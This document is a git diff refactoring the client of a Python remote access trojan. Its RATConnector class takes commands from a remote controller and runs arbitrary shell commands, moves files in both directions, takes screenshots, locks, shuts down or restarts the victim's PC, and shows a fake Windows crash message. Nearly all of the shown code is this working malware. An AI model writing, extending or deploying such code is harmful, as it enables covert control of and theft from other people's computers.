@@ -8,6 +8,7 @@ import ctypes
 import sys
 import pyautogui
 import PIL
+from client.commands import message
 import commands
 
 
@@ -49,22 +50,6 @@ class RATConnector:
             else:
                 break
 
-    # # Function for sending data as JSON
-    # def dataSend(self, data):
-    #     jsonData = json.dumps(data)
-    #     self.connection.send(jsonData.encode())
-
-    # # Function for receiving data as JSON
-    # def dataReceive(self):
-    #     jsonData = b""
-    #     while True:
-    #         try:
-    #             jsonData += self.connection.recv(1024)
-    #             return json.loads(jsonData)
-    #         # If ValueError returned then more data needs to be sent
-    #         except ValueError:
-    #             continue
-
     def arrayToString(self, s):
         """переводит массив в строку"""
         convStr = ""
@@ -75,9 +60,7 @@ class RATConnector:
     # Запускает любую конанду в консоле
     def runCommand(self, command):
         """запускает команду в консоле"""
-        return subprocess.check_output(
-            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
-        )
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     # Reading files with base 64 encryption for non UTF-8 compatability
     def readFile(self, path):
@@ -109,41 +92,37 @@ class RATConnector:
                     self.connection.close()
                     sys.exit()
                 elif command[0] == "ratHelp":
-                    commandResponse = ""
+                    command_response = ""
                 elif command[0] == "cd" and len(command) > 1:
                     os.chdir(command[1])
-                    commandResponse = "[+] Changing active directory to " + command[1]
+                    command_response = "[+] Changing active directory to " + command[1]
                 elif command[0] == "upload":
-                    commandResponse = self.writeFile(
-                        command[1], command[2])
+                    command_response = self.writeFile(command[1], command[2])
                 elif command[0] == "download":
-                    commandResponse = self.readFile(command[1]).decode()
+                    command_response = self.readFile(command[1]).decode()
                 elif command[0] == "message":
-                    # Shows a message box with the requested message using ctypes
-                    ctypes.windll.user32.MessageBoxW(
-                        0, command[1], "Windows fatal exception: code 0xc06d007e", 1
-                    )
-                    commandResponse = "[+] Message received by client"
+                    command_response = commands.message(command[:1])
                 elif command[0] == "lock":
-                    ctypes.windll.user32.LockWorkStation()
-                    commandResponse = "[+] Clients PC locked"
+                    command_response = commands.lock_pc()
                 elif command[0] == "shutdown":
-                    os.system("shutdown /s /t 1")
+                    command_response = commands.shutdown_pc()
                 elif command[0] == "restart":
-                    os.system("shutdown /r /t 1")
+                    command_response = commands.restart_pc()
                 elif command[0] == "screenshot":
-                    commandResponse = self.screen_handler()
+                    command_response = self.screen_handler()
                 elif command[0] == "screamer":
-                    commandResponse = commands.screamer()
+                    command_response = commands.screamer()
+                elif command[0] == "syscom":
+                    command_response = commands.sys_command(command[1:])
                 else:
                     convCommand = self.arrayToString(command)
-                    commandResponse = self.runCommand(convCommand).decode()
+                    command_response = self.runCommand(convCommand).decode()
             # Whole error handling, bad practice but required to keep connection
             except Exception as e:
-                commandResponse = (
+                command_response = (
                     f"[-] Error running command: {e}"
                 )
-            self.send_json(commandResponse)
+            self.send_json(command_response)
 
 
 print("run")
